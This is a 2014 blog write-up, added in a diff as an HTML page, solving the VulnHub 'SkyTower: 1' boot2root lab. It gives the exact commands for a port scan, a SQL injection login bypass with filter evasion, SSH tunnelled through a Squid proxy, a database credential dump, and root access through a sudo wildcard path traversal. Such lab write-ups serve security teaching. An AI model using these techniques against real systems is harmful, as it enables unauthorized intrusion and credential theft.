@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>SkyTower: 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-06-29">June 29, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/skytower">skytower</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">SkyTower: 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>SkyTower is a boot2root challenge hosted at VulnHub.  The goal is to reach /root/flag.txt.</p>
+
+<h2 id="nmap:9b0fe4d66100ab98a2421f7d860ef8e6">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -A -p- 192.168.127.128
+
+PORT     STATE    SERVICE    VERSION
+22/tcp   filtered ssh
+80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+3128/tcp open     http-proxy Squid http proxy 3.1.20
+|_http-methods: No Allow or Public header in OPTIONS response (status code 400)
+|_http-title: ERROR: The requested URL could not be retrieved
+</code></pre>
+
+<h2 id="skytower-login:9b0fe4d66100ab98a2421f7d860ef8e6">SkyTower Login</h2>
+
+<p>I punched the IP into Iceweasel and was greeted with a login screen.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/skytower-1/login.png"  />
+    
+    
+</figure>
+</div>
+
+<p>The post data of login.php looks like <code>email=&amp;password=</code>.  Instead of using the browser, I elected to attempt some injection with cURL.  First, a simple test with username and password as x.</p>
+
+<pre><code class="language-text">root@kali:~# curl http://192.168.127.128/login.php --data &quot;email=x&amp;password=x&quot;
+&lt;br&gt;Login Failed&lt;/br&gt;
+</code></pre>
+
+<p>After inserting an apostrophe into the email field, I received this error:</p>
+
+<pre><code class="language-text">root@kali:~# curl http://192.168.127.128/login.php --data &quot;email='&amp;password=&quot;
+There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' and password=''' at line 1]
+</code></pre>
+
+<p>I tried various authentication bypass injections:</p>
+
+<pre><code class="language-text">root@kali:~# curl http://192.168.127.128/login.php --data &quot;email='&amp;password=' or '1'='1&quot;
+There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1''1'' at line 1]
+</code></pre>
+
+<p>This is a rather curious error message - it appears as though &lsquo;or&rsquo; has been filtered out of my request.  I spent a bunch of time looking at SQLi filter evasion and possible wildcard inclusion.  I finally found the following injection worked:</p>
+
+<pre><code class="language-text">root@kali:~# curl http://192.168.127.128/login.php --data &quot;email='*'&amp;password='*'&quot;
+</code></pre>
+
+<p>For clarity, the result of that injection is screenshot below.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/skytower-1/john.png"  />
+    
+    
+</figure>
+</div>
+
+<p>$2 retirement fund&hellip; a bit stingy to say the least&hellip;</p>
+
+<h2 id="secure-shell:9b0fe4d66100ab98a2421f7d860ef8e6">Secure Shell</h2>
+
+<p>This message is very useful, in that it flat out tells us to SSH into the box and even provides a username and password.  However, if we recall the Nmap scan port 22 was filtered, but there is a Squid proxy running.  I used proxytunnel to establish a connection to port 22.</p>
+
+<pre><code class="language-text">root@kali:~# proxytunnel -p 192.168.127.128:3128 -d 127.0.0.1:22 -a 2222
+root@kali:~# ssh john@127.0.0.1 -p 2222
+john@127.0.0.1's password: 
+Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
+ 
+Funds have been withdrawn
+Connection to 127.0.0.1 closed.
+</code></pre>
+
+<p>So I was able to login, but was instantly kicked.  There were several ways to get around this.  The first is to modify the users&rsquo; <code>.bashrc</code> file:</p>
+
+<pre><code class="language-text">root@kali:~# ssh john @ 127.0.0.1 -p 2222 &quot;cat /home/john/.bashrc&quot;
+ 
+echo
+echo  &quot;Funds have been withdrawn&quot;
+exit
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# ssh john @ 127.0.0.1 -p 2222 &quot;sed -i '/exit/s/^/#/' /home/john/.bashrc&quot;
+</code></pre>
+
+<p>The second is simply to execute another instance of <code>sh</code> or <code>bash</code>.</p>
+
+<pre><code class="language-text">root@kali:~# ssh john @ 127.0.0.1 -p 2222 &quot;/bin/bash&quot;
+</code></pre>
+
+<p>In anycase, I now have a shell.  John doesn&rsquo;t have sudo rights but he does have the permissions to read the <code>login.php</code> file.</p>
+
+<pre><code class="language-text">john@SkyTower:~$ cat /var/www/login.php 
+$db = new mysqli('localhost', 'root', 'root', 'SkyTech');
+</code></pre>
+
+<p>It&rsquo;s also interesting to see the SQLi filtering which was going on:</p>
+
+<pre><code class="language-php">$sqlinjection = array(&quot;SELECT&quot;, &quot;TRUE&quot;, &quot;FALSE&quot;, &quot;--&quot;,&quot;OR&quot;, &quot;=&quot;, &quot;,&quot;, &quot;AND&quot;, &quot;NOT&quot;);
+$email = str_ireplace($sqlinjection, &quot;&quot;, $_POST['email']);
+$password = str_ireplace($sqlinjection, &quot;&quot;, $_POST['password']);
+</code></pre>
+
+<h2 id="mysql:9b0fe4d66100ab98a2421f7d860ef8e6">MySQL</h2>
+
+<p>With these credentials, I was able to log in and explore the SQL database and extract the passwords of two other users.</p>
+
+<pre><code class="language-text">john@SkyTower:~$ mysql -uroot -proot
+ 
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| SkyTech            |
+| mysql              |
+| performance_schema |
++--------------------+
+ 
+mysql&gt; use SkyTech
+ 
+mysql&gt; show tables;
++-------------------+
+| Tables_in_SkyTech |
++-------------------+
+| login             |
++-------------------+
+ 
+mysql&gt; select * from login;
++----+----------------------+--------------+
+| id | email                | password     |
++----+----------------------+--------------+
+|  1 | john @skytech.com    | hereisjohn   |
+|  2 | sara @skytech.com    | ihatethisjob |
+|  3 | william @skytech.com | senseable    |
++----+---------------------+---------------+
+</code></pre>
+
+<p>I SSH&rsquo;d in as Sara (after fixing the <code>.bashrc</code> file as before) and found that she has some sudo rights.</p>
+
+<pre><code class="language-text">sara@SkyTower:~$ sudo -l
+ 
+User sara may run the following commands on this host:
+    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
+</code></pre>
+
+<p>The wildcard in these allowances are actually vulnerable to a directory traversal type effect.</p>
+
+<h2 id="root:9b0fe4d66100ab98a2421f7d860ef8e6">Root</h2>
+
+<pre><code class="language-text">sara@SkyTower:~$ sudo /bin/ls /accounts/../root/
+flag.txt
+ 
+sara@SkyTower:~$ sudo /bin/cat /accounts/../root/flag.txt
+Congratz, have a cold one to celebrate!
+root password is theskytower
+</code></pre>
+
+<p>Even though I had root access, I wanted to explore William&rsquo;s account.  The password within the SkyTech database was incorrect for the user, so I cracked the real password by obtaining the shadow file.  William&rsquo;s real password is <code>sensable</code>, not <code>senseable</code> - not sure if this is a typo in the database or intentional.  Either way, I didn&rsquo;t find anything interesting within his user space.</p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
